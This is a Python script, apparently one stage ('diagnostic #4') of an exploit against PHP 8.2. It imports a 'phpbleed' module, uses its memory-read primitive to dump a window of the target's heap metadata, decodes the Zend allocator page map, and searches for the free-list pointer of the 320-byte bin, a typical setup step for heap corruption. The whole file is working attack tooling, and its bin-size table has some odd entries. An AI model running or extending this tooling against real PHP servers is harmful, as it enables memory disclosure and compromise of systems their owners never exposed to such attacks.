#!/usr/bin/env python3
"""R-6 diagnostic #4: save the meta window, decode with the CORRECT 8.2
offsets (heap_slot @ chunk+0x40, sizeof(heap)=0x198, free_map @ +0x40+0x198,
page map @ chunk+0x218 => data offset 0x1C0), find TRUE bin-320 SRUN pages,
and identify which data offset holds heap->free_slot[16] (must point at a
320-grid slot inside a true bin-320 page)."""
import json
import struct
import importlib.util

spec = importlib.util.spec_from_file_location('pb', 'phpbleed_8089.py')
pb = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pb)

st = json.load(open(pb.STATE_FILE))
chunk = (st['heap_ref']) & ~0x1FFFFF

assert pb.pin_open(), "pin open failed"
r = pb.isstring_read(chunk + 0x40, pinned=True)
assert r, "meta read failed"
slen, data = r
open('window.bin', 'wb').write(data)
print(f"window saved: {len(data)}B (heap->size={slen})")

TRUE_MAP_OFF = 0x218 - 0x58  # = 0x1C0
BIN_SIZES = [8,16,24,32,40,48,56,64,80,96,112,128,160,192,224,256,320,
             384,448,512,640,768,896,1024,1280,1536,1792,2048,2304,2560,2828,3072,3072]

def page_info(pn):
    return struct.unpack_from('<I', data, TRUE_MAP_OFF + pn * 4)[0]

print("\n=== TRUE page map (pages 80..140) ===")
sruns = {}
for pn in range(1, 512):
    if TRUE_MAP_OFF + pn * 4 + 4 > len(data):
        break
    info = page_info(pn)
    if info == 0:
        continue
    srun = (info & 0x80000000) != 0
    lrun = (info & 0x40000000) != 0
    b = info & 0x1F
    fc = (info >> 16) & 0x1FF
    if srun and not lrun:
        sruns.setdefault(b, []).append((pn, fc))
    if 80 <= pn <= 140:
        kind = ''
        if srun and not lrun:
            kind = f'SRUN bin={BIN_SIZES[b] if b < 32 else b}B free={fc}'
        elif lrun and not srun:
            kind = f'LRUN pages={info & 0x1FF}'
        else:
            kind = f'0xC-flags bin={b} free={fc}'
        print(f"  page {pn}: {info:#010x} {kind}")

print("\n=== SRUN summary ===")
for b, lst in sorted(sruns.items()):
    print(f"  bin {b} ({BIN_SIZES[b]}B): {lst}")

print("\n=== free_slot[] candidate decode (data offsets 8..270, heap+0x20 = data+8) ===")
for i in range(8, 272, 8):
    v = struct.unpack_from('<Q', data, i)[0]
    if v == 0:
        continue
    tag = ''
    if chunk <= v < chunk + 0x200000:
        pg = (v - chunk) >> 12
        off = (v - chunk) & 0xFFF
        info = page_info(pg) if TRUE_MAP_OFF + pg * 4 + 4 <= len(data) else 0
        b = info & 0x1F
        srun = (info & 0x80000000) != 0
        lrun = (info & 0x40000000) != 0
        grid = (off % 320 == 0)
        if srun and not lrun and b == 16 and grid:
            tag = '  <<<<< heap->free_slot[16]-compatible (bin-320 grid slot)'
        elif srun and not lrun:
            tag = f' -> page {pg} +{off:#x} (SRUN bin {BIN_SIZES[b]}B)'
        else:
            tag = f' -> page {pg} +{off:#x} (info {info:#010x})'
    print(f"  data[{i:3}] = {v:#018x}{tag}")

pb.pin_close()
print("\ndone")
